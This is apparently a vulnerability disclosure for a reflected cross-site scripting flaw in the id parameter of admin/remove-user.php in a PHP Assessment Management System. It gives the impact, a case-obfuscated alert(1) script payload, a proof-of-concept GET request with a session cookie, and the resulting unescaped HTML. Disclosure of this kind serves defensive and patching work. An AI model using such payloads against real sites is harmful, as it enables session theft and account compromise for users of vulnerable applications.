#   Assessment Management System admin/remove-user.php Reflected XSS Vulnerability

  A reflected cross-site scripting (XSS) vulnerability exists in the `admin/remove-user.php` file of the Assessment
  Management System. The application reflects user-controlled input from the `id` parameter into an HTML attribute
  without proper output encoding. As a result, an attacker can inject arbitrary JavaScript that executes in the
  browser of a victim who visits a crafted URL.

##  

##  Impact of the Vulnerability

  This vulnerability may allow an attacker to execute arbitrary JavaScript in the browser of a logged-in administrator
  or other authenticated user. Successful exploitation may lead to session theft, unauthorized actions, sensitive
  information disclosure, or account compromise within the application context.

##  

##  Payload

```
"><ScRiPt>alert(1)</sCrIpT>
```

"><ScRiPt>alert(1)</sCrIpT>



##   Proof of Concept

  Send the following request to the vulnerable endpoint:

```http
GET /admin/remove-user.php?id="><ScRiPt>alert(1)</sCrIpT> HTTP/1.1
Host: assessment
Cookie: PHPSESSID=f11os756ltsdgbtk776pklo8cs
```

  The application reflects the `id` parameter into the `value` attribute of the Username field without HTML escaping:

```html
<input class="form-control" type="text" value="\"><ScRiPt>alert(1)</sCrIpT>" readonly>
```

  The injected double quote closes the original `value` attribute, and the following `<script>` element is interpreted
  by the browser as executable HTML/JavaScript. This confirms the presence of a reflected XSS vulnerability in
  `admin/remove-user.php`.

##  

##  Source Download

```
 [Assessment Management In PHP With Source Code - Source Code & Projects](https://code-projects.org/assessment-management-in-php-with-source-code/)
```

[Assessment Management In PHP With Source Code - Source Code & Projects](https://code-projects.org/assessment-management-in-php-with-source-code/)



![image-20260603101530660](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260603101530660.png)
